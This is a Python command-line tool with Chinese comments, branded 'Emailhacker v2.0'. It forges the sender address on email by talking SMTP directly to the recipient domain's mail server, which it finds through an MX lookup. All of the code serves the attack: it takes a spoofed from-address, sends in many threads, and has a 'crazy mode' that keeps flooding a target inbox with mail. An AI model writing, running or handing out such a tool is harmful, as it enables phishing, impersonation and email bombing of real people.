# -*- coding: utf-8 -*-
import socket
from time import sleep
import random
import threading
import dns.resolver
import argparse
import signal
import sys
import string
import os


class FakeEmail:
    def __init__(self, to_addr, from_addr, SMTP_addr, port=25, timeout=10):
        Print(u"check config", sign=u"[+]")
        Print(u"to address: "+to_addr)
        Print(u"from address: "+from_addr)
        Print(u"SMTP address: "+SMTP_addr)
        Print(u"SMTP port: "+str(port))
        Print(u"socket timeout: "+str(timeout))
        Print(u"verbose level: "+str(verbose))
        Print(u"no problem, maybe", sign=u"  [*]")

        self.to_addr = to_addr  # 发送到哪个邮箱？
        self.from_addr = from_addr  # 哪个邮箱发送的？
        self.port = port  # SMTP 服务器的端口
        self.timeout = timeout  # socket 超时时间
        self.SMTP_addr = SMTP_addr  # SMTP 服务器的地址
        self.quit_flag = 1  # 自己提醒自己退出
        self.succ_num = 0  # 邮件发送成功的数量

    def Connect(self):
        """
        作用: 连接到 SMTP 服务器

        返回类型:
            元组

        返回值:
            (True, SMTP 服务器的响应)
            (False, 报错信息)
        """

        self.sk = socket.socket()
        self.sk.settimeout(self.timeout)  # 连接超时时间

        try:
            Print(u"connect to %s:%s " % (self.SMTP_addr, str(self.port)), sign=u"[+]")
            self.sk.connect((self.SMTP_addr, self.port))
        except Exception as e:  # 连接超时
            return (False, str(e))

        return self.Recv(check=u"220")  # 由 Recv 接管返回值

    def Send(self, msg):
        """
        作用: 通过 socket 向 SMTP 服务器发送信息

        参数:
            msg: 要发送的信息

        返回类型:
            布尔

        返回值:
            True
            False
        """

        # 发送的消息以 "\r\n" 作为分割的标志
        # 分割后按顺序发送
        for result in msg.split(u"\r\n"):
            try:

                self.sk.sendall((result+u"\r\n").encode("utf8"))  # 信息必须以 "\r\n" 结尾
                Print(result, threshold=2, color=u"yellow", sign=u"=> ")
            except Exception as e:  # 发送失败
                Print(str(e), threshold=0, color=u"red", sign=u"=> ", id=self.id)
                return False

        return True

    def Recv(self, check=u"", threshold=2):
        """
        作用: 通过 socket 向 SMTP 服务器发送信息

        参数:
            check: 根据 check 来检查收到的信息；
                   若 check 在收到的信息里，则说明符合预期，否则不符合；
                   check 为空则不进行检查。
            threshold: 用于 Print 函数；SMTP 服务器传回的信息不一定都要打印出来；

        返回类型:
            元组

        返回值:
            (True, )
            (False, 报错信息)
        """

        try:
            # 收到的信息也以 "\r\n" 作为分割
            data = [i.decode(u"utf8") for i in self.sk.recv(1024).split(b"\r\n") if i]
            assert data  # 确认一下消息不为空
        except AssertionError:  # 若消息为空
            if not check:
                Print(u"recv empty answer", threshold=0, color=u"red", sign=u"<= ", id=self.id)
            return (False, u"recv empty answer")
        except Exception as e:  # 若出现意外导致报错
            if not check:
                Print(str(e), threshold=0, color=u"red", sign=u"<= ", id=self.id)
            return (False, str(e))

        # 若进行检查且检查不符合预期，则返回信息的最后一行
        if check and check not in data[-1]:
            return (False, data[-1])

        # SMTP 的错误代码分布在 400-600之间
        # 若错误代码不存在于信息的最后一行，则说明返回正确的信息
        # 否则需要打印错误信息，返回信息的最后一行
        if any([i for i in range(400, 600) if data[-1][:3] == str(i)]):
            Print(data[-1], threshold=0, color=u"red", sign=u"<= ", id=self.id)
            return (False, data[-1])

        # 依次打印返回的信息
        for result in data:
            Print(result, threshold=threshold, color=u"green", sign=u"<= ")

        return (True, data[-1])  # 这里的 data[-1] 不会用到

    def Attack(self, id):
        """
        作用: 攻击的主要代码

        参数:
            id: 线程的唯一标识
        """

        global succ_num, failed_num, quit_flag, threads_alive, Data

        self.id = id

        # 主线程没有发出退出指令，且自己没有发出退出指令
        while quit_flag and self.quit_flag:
            check_connect = self.Connect()
            if not check_connect[0]:  # 发起连接失败
                Print(u"creating connection failed: "+u"I just got the answer: '%s' from %s" % (check_connect[1], self.SMTP_addr),
                      threshold=0, color=u"red", sign=u"[X]", flag=0, id=self.id)
                self.sk.close()
                failed_num += 1
                if crazy_mode:  # 为长连接模式，则继续尝试发起连接请求
                    continue
                else:  # 否则直接退出
                    break

            Print(u"now, all ready", sign=u"  [*]")
            Print(u"using spam attack", sign=u"[+]")

            # ehlo 成功，且成功收到信息
            if not (self.Send(u"ehlo antispam") and self.Recv()[0]):
                failed_num += 1
                if crazy_mode:  # 为长连接模式，则继续尝试 ehlo antispam
                    continue
                else:  # 否则直接退出
                    break

            # 至此，线程不会再尝试 ehlo antispam，而是持续使用建立好的通道
            # 主线程没有发出退出指令，且自身没有发出退出指令
            while quit_flag and self.quit_flag:
                # 发送邮件头
                if not (
                    self.Send(u"mail from:<%s>" % self.from_addr) and self.Recv()[0]
                ) or not (
                    self.Send(u"rcpt to:<%s>" % self.to_addr) and self.Recv()[0]
                ) or not (
                    self.Send(u"data") and self.Recv()[0]
                ):  # 三个有一个失败就认定为失败

                    failed_num += 1
                    if not crazy_mode:  # 不为长连接模式
                        self.quit_flag = 0  # 发出自身退出指令
                    continue  # 重新发送邮件头

                # 发送邮件内容
                if self.Send(
                    u"to: %s" % self.to_addr
                ) and self.Send(
                    u"from: %s" % self.from_addr
                ) and self.Send(
                    "subject: "+subject
                ) and self.Send(
                    u""
                ) and self.Send(
                    body+"\r\n\r\nYour random id is "+"".join(
                        random.choice(string.hexdigits) for i in range(32)
                    )+"\r\n."
                ):  # 四个都成功的话

                    result = self.Recv(threshold=0, check=u"250")  # 检查返回状态码是否为 250
                    if result[0]:  # 发送邮件成功
                        succ_num += 1
                        self.succ_num += 1
                        Data[id] = PutColor(self.succ_num, "cyan")
                    else:  # 发送邮件失败
                        Print(result[1], threshold=0, color=u"red", sign=u"<= ", id=self.id)
                        failed_num += 1
                else:  # 四个有一个失败，说明发送邮件失败
                    failed_num += 1

                if not crazy_mode:  # 若不为长连接模式
                    self.quit_flag = 0  # 发出自身退出指令
                else:
                    sleep(random.random()*1.5)  # 随机延时，准备下一封邮件的发送

        Print(u"all done", sign=u"  [*]")
        threads_alive[id] = 0  # 标记本线程已经结束
        return self.sk.close()  # 关闭本线程的 socket 连接


def PutColor(string, color):
    """
    作用：给终端加点颜色

    参数：
        string：要上色的字符串
        color：颜色

    返回类型：字符串
    返回值：加了颜色的字符串
    """

    colors = {
        u"gray": "2",
        u"red": "31",
        u"green": "32",
        u"yellow": "33",
        u"blue": "34",
        u"pink": "35",
        u"cyan": "36",
        u"white": "37",
    }

    return u"\033[40;1;%s;40m%s\033[0m" % (colors[color], string)


def superPrint():
    """
    作用: 固定行打印

    仅在 verbose 为 0 的时候启用
    """

    Lock.acquire()

    _, fixed_length = os.popen('stty size', 'r').read().split()  # 获得终端的长度
    fixed_length = int(fixed_length)
    for index in Indicator("attacking..."):
        for i, data in enumerate(Data):
            _, length = os.popen('stty size', 'r').read().split()  # 获得终端的长度
            length = int(length)
            if fixed_length > length:  # 若终端变窄
                show_logo()  # 重新绘制终端
                fixed_length = length

            print(
                "\033[K\r%s%s" % (
                    PutColor("No.%d: " % i, "white"),
                    data if len(data) < length else data[:length-3]+"..."
                )
            )  # 超出终端长度的部分用 ... 代替

        print(PutColor("\r\033[K[%d]" % succ_num, "green")+PutColor(index, "white")+"\033[1A")
        print("\033[%dA" % (len(Data)+1))
        sleep(0.1)

    # 退出的时候，再打印一次
    for i, data in enumerate(Data):
        print(
            "\033[K\r%s%s" % (
                PutColor("No.%d: " % i, "white"),
                data if len(data) < length else data[:length-3]+"..."
            )
        )

    if crazy_mode != 1:  # 纯属美化，无实际作用
        print("")

    Lock.release()


def Print(string, threshold=3, color=u"gray", sign=u"  [-]", flag=1, id=-1):
    global Data

    if verbose < threshold or (verbose == 0 and threshold > -1):
        if id != -1:
            Data[id] = PutColor(string, color)
        return

    str_color = u"gray" if color == u"gray" else u"white"
    string = PutColor(sign, color)+PutColor(string, str_color)
    if verbose > 2 and threshold < 3 and flag:
        string = "  [-]"+string

    if Lock.acquire():
        print("\r"+string)
        Lock.release()


def DNSQuery(to_addr):
    resolver = dns.resolver.Resolver()
    resolver.timeout = 3
    resolver.lifetime = 3

    Print(u"query MX of DNS for %s" % to_addr, sign=u"[+]")

    try:
        SMTP_addr = b'.'.join(dns.resolver.query(
            to_addr[to_addr.find(u"@")+1:], u'MX')[0].exchange.labels).decode(u"utf8")
        assert SMTP_addr != u""
    except Exception as e:
        Print(u"query MX of %s failed: " % to_addr + str(e),
              threshold=0, color=u"red", sign=u"[X]", flag=0)
        return 0

    Print(u"success", sign=u"  [*]")
    return SMTP_addr


def Launcher():
    if not verbose:
        threading.Thread(target=superPrint).start()

    threads = []
    for id in range(threads_num):
        client = FakeEmail(to_addr, from_addr, SMTP_addr=SMTP_addr)
        t = threading.Thread(target=client.Attack, args=(id,))
        t.start()
        threads.append(t)

    if not crazy_mode:
        for t in threads:
            t.join()
    else:
        for i in Indicator("attacking..."):
            Print(i+"\033[1A", color="green", threshold=0, flag=0, sign="\033[K[%d]" % succ_num)
            sleep(0.1)


def Indicator(string, index=0):
    while any(threads_alive) and ver == "go" and print_flag:
        index = (index+1) % len(string)
        yield string[:index]+string[index].upper()+string[index+1:]


def quit(signum, frame):
    global quit_flag, print_flag

    print_flag = 0
    Lock.acquire()
    Lock.release()
    print_flag = 1
    quit_flag = 0
    for i in Indicator("stopping..."):
        Print(i+"\033[1A", color="yellow", threshold=-1, flag=0, sign="\033[K[!]")
        sleep(0.1)

    Print(u"%s %s" % (u"success:", succ_num), threshold=-1,
          color=u"green", flag=0, sign="\n"*(crazy_mode == True)+"\n[*]")
    Print(u"%s %s\n" % (u"failed:", failed_num), threshold=-1, color=u"red", flag=0, sign="[!]")

    print("\033[?25h"+PutColor(random.choice([
        u"Goodbye", u"Have a nice day", u"See you later",
        u"Farewell", u"Cheerio", u"Bye",
    ])+" :)", u"white"))
    sys.exit()


def show_logo():
    """
    打印 logo

    - 打印 logo 的时候总是清空终端
    """

    print("\033c\033[?25l")  # 清空终端
    print("""
\033[40;1;40m ███████╗     ██╗  ██╗\033[0m
\033[40;1;40m ██╔════╝     ██║  ██║ \033[40;1;33;40mTr0y\033[0m\033[0m
\033[40;1;40m █████╗       ███████║ \033[0m
\033[40;1;40m ██╔══╝       ██╔══██║ \033[40;1;33;40mv2.0\033[0m\033[0m
\033[40;1;40m ███████╗     ██║  ██║\033[0m
 ╚══════╝\033[40;1;32;40mmail\033[0m ╚═╝  ╚═╝\033[40;1;32;40macker\033[0m
""")  # 打印 logo


signal.signal(signal.SIGINT, quit)
signal.signal(signal.SIGTERM, quit)
parser = argparse.ArgumentParser()
parser.add_argument(u"-faddr", u"--from_address",
                    help=u"fake-from-address", required=True)

parser.add_argument(u"-taddr", u"--to_address",
                    help=u"the address you want to delivery", required=True)

parser.add_argument(u"-s", u"--subject",
                    help=u"email's subject", required=True)

parser.add_argument(u"-b", u"--body",
                    help=u"email's body(content)", required=True)

parser.add_argument(u"-tnum", u"--threads_num",
                    help=u"how many threads you want (default is 1)", default=1, type=int)

parser.add_argument(u"-v", u"--verbose",
                    help=u"verbose level (choice in [0, 1, 2, 3])", default=-1, type=int)

parser.add_argument(u"-c", u"--crazy_mode",
                    help=u"Keep sending fake-email (default is False ** Use with caution **)", action='store_true', default=False)


args = parser.parse_args()

show_logo()
succ_num = failed_num = 0
quit_flag = print_flag = 1
ver = -1
from_addr = args.from_address
to_addr = args.to_address
subject = args.subject.decode("utf8") if vars(str).get("decode") else args.subject
body = (args.body.decode(
    "utf8") if vars(str).get("decode") else args.body).replace("\\n", "\r\n")
threads_num = args.threads_num if args.threads_num > 0 else 1
verbose = args.verbose
crazy_mode = args.crazy_mode
threads_alive = [1]*threads_num
Data = ['0']*threads_num
Lock = threading.Lock()

if verbose == -1:
    verbose = 0 if crazy_mode else 2 if threads_num == 1 else 1

elif threads_num > 1:
    if crazy_mode and verbose > 1:
        ver = 0
        Print(u"""...It's not recommended to enable so many output(let verbose>0)
...in the multi-threaded mode with crazy mode,
...change it to 0? (let verbose=0)""",
              color=u"yellow", threshold=0, sign=u"[!]WARNING: \n", flag=0)
    elif verbose > 1:
        ver = 1
        Print(u"""...It's not recommended to enable so many output(let verbose>1)
...in the multi-threaded mode,
...change it to 1? (let verbose=1)""",
              color=u"yellow", threshold=0, sign=u"[!]WARNING: \n", flag=0)

if ver != -1:
    if vars(__builtins__).get('raw_input', input)(PutColor(u"[!]", "yellow")+PutColor("type [yes]/no: ", "white")) != "no":
        verbose = ver
        Print(u"as you wish\n", color=u"green", threshold=0, sign=u"[*]", flag=0)
    else:
        Print(u"in a mess, of course\n", color=u"yellow", threshold=0, sign=u"[!]", flag=0)

SMTP_addr = DNSQuery(to_addr)
if SMTP_addr:
    ver = "go"
    Launcher()
else:
    threads_alive = [0]

quit(0, 0)
